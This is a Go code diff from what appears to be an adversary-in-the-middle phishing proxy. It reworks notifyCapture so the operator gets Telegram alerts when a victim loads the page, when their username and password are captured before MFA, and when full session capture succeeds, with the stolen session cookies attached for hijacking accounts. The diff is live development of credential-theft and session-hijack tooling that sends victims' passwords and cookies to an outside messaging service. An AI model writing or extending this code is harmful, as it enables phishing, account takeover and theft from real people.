@@ -263,11 +263,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		"source":      "proxy",
 	})
 
-	// Only fire Telegram when MFA session cookies (ESTSAUTH etc) are captured.
-	if !hasSession {
-		return
-	}
-
+	// Always notify Telegram — different severity per event type
 	if !telegramOk {
 		return
 	}
@@ -276,24 +272,50 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 	ip := r.RemoteAddr
 	ua := r.UserAgent()
 
-	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
-		"👤 Username: %s\n"+
-		"🔑 Password: %s\n"+
-		"🌐 IP: %s\n"+
-		"💻 User-Agent: %s\n"+
-		"🕐 Time: %s\n"+
-		"🎯 Campaign: %s\n"+
-		"🔗 Upstream: %s",
-		pl.Label, username,
-		username, password,
-		ip, ua,
-		captureTimeDisplay, campaignID,
-		upstream)
+	// Severity-based message format
+	var msg string
+	if hasSession {
+		msg = fmt.Sprintf("🔴 FULL CAPTURE | %s | %s\n"+
+			"👤 Username: %s\n"+
+			"🔑 Password: %s\n"+
+			"🌐 IP: %s\n"+
+			"💻 User-Agent: %s\n"+
+			"🕐 Time: %s\n"+
+			"🎯 Campaign: %s\n"+
+			"📎 Session: ✅ COOKIES CAPTURED",
+			pl.Label, username,
+			username, password,
+			ip, ua,
+			captureTimeDisplay, campaignID)
+	} else if username != "" {
+		msg = fmt.Sprintf("🔑 CREDS CAPTURED | %s | %s\n"+
+			"👤 Username: %s\n"+
+			"🔑 Password: %s\n"+
+			"🌐 IP: %s\n"+
+			"💻 User-Agent: %s\n"+
+			"🕐 Time: %s\n"+
+			"🎯 Campaign: %s\n"+
+			"⚠️ Status: Waiting for MFA — no session cookies yet",
+			pl.Label, username,
+			username, password,
+			ip, ua,
+			captureTimeDisplay, campaignID)
+	} else {
+		msg = fmt.Sprintf("📄 PAGE LOAD | %s\n"+
+			"🌐 IP: %s\n"+
+			"💻 User-Agent: %s\n"+
+			"🕐 Time: %s\n"+
+			"🎯 Campaign: %s\n"+
+			"⚠️ Status: Victim clicked — no credentials submitted yet",
+			pl.Label,
+			ip, ua,
+			captureTimeDisplay, campaignID)
+	}
 
 	sendTelegramMessage(msg)
 
-	// Send ALL captured cookies for full session hijack
-	if len(capturedCookies) > 0 || len(victimCookies) > 0 {
+	// Only send cookie attachment on MFA completion
+	if hasSession && (len(capturedCookies) > 0 || len(victimCookies) > 0) {
 		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
 			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\nCampaign: %s\n\n",
 			upstream, pl.Label, username, ip, captureTimeDisplay, campaignID)
